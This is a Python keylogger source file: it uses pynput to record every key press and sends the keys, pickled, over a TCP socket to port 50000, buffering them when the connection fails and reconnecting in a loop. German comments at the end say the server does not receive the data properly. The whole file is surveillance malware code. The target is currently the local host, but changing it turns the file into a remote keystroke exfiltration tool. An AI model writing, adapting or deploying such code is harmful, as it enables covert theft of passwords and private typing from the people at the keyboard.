from pynput.keyboard import Listener
import socket
from pickle import dumps


class Global:
    key_array = []
    i = 0


class Socket:

    connection = False

    def __init__(self):
        try:
            self.active_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.active_socket.connect((socket.gethostname(), 50000))
            Socket.connection = True
            print("Connection established")
        except ConnectionRefusedError:
            print("No connection established!")
            pass

    def send_char(self, char):
        char = dumps(char)
        if Socket.connection:
            try:
                self.active_socket.send(char)
                return True
            except (ConnectionResetError, ConnectionAbortedError, OSError):
                return False
        else:
            return False

    def send_array(self, array):
        if Socket.connection:
            array = dumps(array)
            try:
                self.active_socket.send(array)
                Socket.connection = True
                Global.key_array = []
            except(ConnectionResetError, ConnectionAbortedError, OSError):
                Socket.connection = False

    def reconnect(self):
        self.active_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            self.active_socket.connect((socket.gethostname(), 50000))
            Socket.connection = True
        except socket.error:
            pass


def no_safe_key_press(key):
    key = str(key).replace("'", "")
    send = active.send_char(key)
    if not send:
        Global.key_array.append(key)
        Socket.connection = False
        return False


def safe_key_press(key):
    key = str(key).replace("'", "")
    Global.key_array.append(key)
    Global.i += 1
    if Global.i == 20:
        Global.i = 0
        return False


while True:
    if not Socket.connection:
        active = Socket()

    if Socket.connection and not Global.key_array:
        with Listener(on_press=no_safe_key_press)as f:
            f.join()

    elif Socket.connection and Global.key_array:
        active.send_array(Global.key_array)

    elif not Socket.connection:
        with Listener(on_press=safe_key_press)as f:
            f.join()
        Global.key_array.append("[Lost Objectives]")



#Enpfängt data nicht richtig
#Wenn Array nicht abgeschickt wird bekommt server daten trozdem nicht
